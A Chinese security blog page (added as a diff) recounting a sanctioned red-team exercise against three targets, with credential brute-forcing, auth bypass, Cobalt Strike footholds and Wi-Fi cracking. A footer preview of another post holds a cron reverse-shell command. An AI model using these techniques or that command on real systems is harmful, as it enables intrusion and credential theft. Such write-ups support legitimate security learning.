@@ -1,0 +1,222 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>一次带队护网 | Putdownd’s Blog</title><meta name="author" content="putdown"><meta name="copyright" content="putdown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言 因为参加了上一届的护网，大致知道本届的一些流程情况 比赛持续十天共抽取三个目标，完成目标后形成报告去裁判评分，进行排名  过程目标一 该目标为供应链公司，为名下企业提供技术支持 裁判认定为打穿  外网 在外网信息收集阶段发现重要系统：nacos 、xxl-job、minio 通过naco..."><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "一次带队护网",
+  "url": "https://blog.putdown.top/archives/19649a6.html",
+  "image": "https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png",
+  "datePublished": "2024-10-11T09:04:08.034Z",
+  "dateModified": "2026-06-15T04:36:32.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "putdown",
+      "url": "https://blog.putdown.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png"><link rel="canonical" href="https://blog.putdown.top/archives/19649a6.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-t8FWZKLQce"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?f755324450eb55ec18bb83a2d2f2334e";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '一次带队护网',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.1.0/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntimes.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Putdownd’s Blog" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(https://t.alcy.cc/fj);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">128</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://t.alcy.cc/fj);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Putdownd’s Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">一次带队护网</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">一次带队护网</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-11T09:04:08.034Z" title="发表于 2024-10-11 09:04:08">2024-10-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-15T04:36:32.000Z" title="更新于 2026-06-15 04:36:32">2026-06-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%A4%E7%BD%91-CTF/">护网/CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
+<li>因为参加了上一届的护网，大致知道本届的一些流程情况</li>
+<li>比赛持续十天共抽取三个目标，完成目标后形成报告去裁判评分，进行排名</li>
+</ul>
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><h2 id="目标一"><a href="#目标一" class="headerlink" title="目标一"></a>目标一</h2><ul>
+<li>该目标为供应链公司，为名下企业提供技术支持</li>
+<li>裁判认定为打穿</li>
+</ul>
+<h3 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h3><ol>
+<li>在外网信息收集阶段发现重要系统：nacos 、xxl-job、minio</li>
+<li>通过nacos权限认证绕过导出配置，在配置文件发现<code>xxl-job</code>、<code>minio</code>账号密码</li>
+<li>在<code>minio</code>内发现该公司相关文件，并找到与员工相关文件得到工号信息</li>
+<li>使用工号爆破<code>sso</code>，设置密码为<code>123456</code>，成功找到一些账户并使用公司的导航主页，比较重要的系统是企业邮箱为后续埋下伏笔</li>
+</ol>
+<h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><ol>
+<li>内网入口为<code>xxl-job</code>反弹<code>shell</code></li>
+<li>通过入口开始扫描和搭建代理</li>
+<li>通过<code>fscan</code>对内网进行扫描找到一些<code>ssh</code>、<code>数据库</code>弱口令等常规扫描信息</li>
+<li>在<code>zabbix</code>的数据库内发现有运维的邮箱和密码，登陆后可以看到与下属公司的邮件往来，并发现该公司的<code>&quot;祖传密码&quot;</code></li>
+<li>通过收集到密码组成密码本对该公司内网的ssh和数据库进行爆破共找到约200台可连接的<code>linux</code></li>
+<li>在数据库找到和sso相关的表，通过解密对一些主要人员的账号进行登录，如 运维、企业老总</li>
+<li>通过<code>sso</code>登录到运维的企业邮箱，在邮件内发现该公司的网络架构，sslvpn等相关信息</li>
+<li>根据网络架构针对性的扫描和爆破后结束目标</li>
+</ol>
+<h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><ul>
+<li>整理完报告细节后去给裁判汇报，分项拿满后开始下一个目标</li>
+</ul>
+<h2 id="目标二"><a href="#目标二" class="headerlink" title="目标二"></a>目标二</h2><ul>
+<li>该目标为大学</li>
+<li>该目标的外网资产只有学院的站群和深信服的<code>sslvpn</code></li>
+</ul>
+<h3 id="外网-1"><a href="#外网-1" class="headerlink" title="外网"></a>外网</h3><ol>
+<li>因为该学校的外网只有<code>sslvpn</code>只能对<code>vpn</code>进项下手，在<code>vpn</code>的介绍处发现有默认密码（该校只能老师使用<code>vpn</code>），在一处泄露找到老师工号信息</li>
+<li>我们几个通过泄露的工号手动一位一位的爆破，终于找到能用的<code>vpn</code>账号</li>
+</ol>
+<h3 id="内网-1"><a href="#内网-1" class="headerlink" title="内网"></a>内网</h3><ol>
+<li>通过连接vpn成功进入到该大学的内网</li>
+<li>开始扫描内网时的时候发现该校的应急速度很快，会删除<code>vpn</code>账号、清理后门而且凌晨还在干活，开始跟运维对抗</li>
+<li>在痛失<code>vpn</code>后，我安排一位同事一直手动爆破，结果是好的，找到有十几个<code>vpn</code>账号</li>
+<li>有了更多的<code>vpn</code>账号后开始权限维持隐藏后门等，在内网不使用危险的操作</li>
+<li>根据扫描结果开始测试，拿到站群、摄像头、门禁等相关系统</li>
+</ol>
+<h3 id="结束-1"><a href="#结束-1" class="headerlink" title="结束"></a>结束</h3><ul>
+<li>汇报后因为没拿到教务相关系统没有满分</li>
+</ul>
+<h2 id="目标三"><a href="#目标三" class="headerlink" title="目标三"></a>目标三</h2><ul>
+<li>该目标在外网只有阿里云的机器，很难进入到内网</li>
+</ul>
+<h3 id="外网-2"><a href="#外网-2" class="headerlink" title="外网"></a>外网</h3><ol>
+<li>外网只有个<code>geoserver</code>服务，该系统存在命令执行漏洞，通过命令执行成功上线到<code>cs</code></li>
+<li>通过<code>cs</code>读取到系统密码，并使用<code>rdp</code>进行连接，找到一些数据库</li>
+<li>始终无法进入到内网、没招那只能近源</li>
+</ol>
+<h3 id="近源"><a href="#近源" class="headerlink" title="近源"></a>近源</h3><ol>
+<li>通过抓取<code>wifi</code>的握手包，并使用针对性的字典，成功使用<code>hashcat</code>跑出<code>wifi</code>密码</li>
+<li>等到晚上，在车里连接到wifi开始扫描本地内网的资产，发现他们本地内网的机器都不出网</li>
+<li>因为只能在晚上所以就通宵了一个晚上，打的比较仓促拿了几十台window服务器和数据库</li>
+<li>只能拿一些系统分和数据分</li>
+</ol>
+<h3 id="结束-2"><a href="#结束-2" class="headerlink" title="结束"></a>结束</h3><ul>
+<li>这个目标因为只能近源再加上机器不出网打的很难受，汇报算分的只拿到满分的三分之二</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.putdown.top">putdown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.putdown.top/archives/19649a6.html">https://blog.putdown.top/archives/19649a6.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.putdown.top" target="_blank">Putdownd’s Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8A%A4%E7%BD%91/">护网</a></div><div class="post-share"><div class="social-share" data-image="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/archives/4f2890e7.html" title="Portainer后渗透"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Portainer后渗透</div></div><div class="info-2"><div class="info-item-1">前言  1docker -H unix:///run/docker.sock run -v /:/test -it ubuntu:latest /bin/bash  1Get &quot;https://registry-1.docker.io/v2/&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)  Portainer 的后渗透 更换镜像源  新建容器          逃逸 1echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#x27; &gt;&gt; /test/var/spool/cron/root   结束</div></div></div></a><a class="pagination-related" href="/archives/2c09554a.html" title="ARL（灯塔）删库后使用docker搭建ARL（灯塔）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">ARL（灯塔）删库后使用docker搭建ARL（灯塔）</div></div><div class="info-2"><div class="info-item-1"> docker 保存命令把镜像保存为本地文件  1234docker tag cd80881c4e0e rabbitmq:localdocker save tophant/arl -o arl.tardocker save mongo -o mongo.tardocker save rabbitmq -o rabbitmq.tar    修改docker-compose.yml的文件 主要修改： tophant/arl:${ARL_VERSION:-latest} 改为 image: tophant/arl:local 以此类推。 以下为修改后。  1docker load &lt; rabbitmq.tar   创建文件  1docker volume create arl_db   启动    注意 数据不会保留 及时更改密码  </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/archives/79087fee.html" title="护网结束"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-18</div><div class="info-item-2">护网结束</div></div><div class="info-2"><div class="info-item-1">“You don’t get to be a legend by being ordinary.”“你不可能凭借平凡无奇的表现成为传奇。”</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-text">过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E4%B8%80"><span class="toc-text">目标一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E7%BD%91"><span class="toc-text">外网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91"><span class="toc-text">内网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-text">结束</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E4%BA%8C"><span class="toc-text">目标二</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E7%BD%91-1"><span class="toc-text">外网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91-1"><span class="toc-text">内网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F-1"><span class="toc-text">结束</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E4%B8%89"><span class="toc-text">目标三</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E7%BD%91-2"><span class="toc-text">外网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%91%E6%BA%90"><span class="toc-text">近源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F-2"><span class="toc-text">结束</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2020 - 2026 By putdown</span></div><div class="footer_custom_text"><div> Welcome to lie down </div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="https://lf6-cdn-tos.bytecdntimes.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://npm.elemecdn.com/meting@2.0.1/dist/Meting.min.js"></script><meting-js server="netease" type="playlist" id="811671960" fixed="true" mini="true" autoplay="false" theme="#49b1f5" loop="all" order="random" preload="auto" volume="0.5" mutex="true"></meting-js><script src="/js/widgets.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
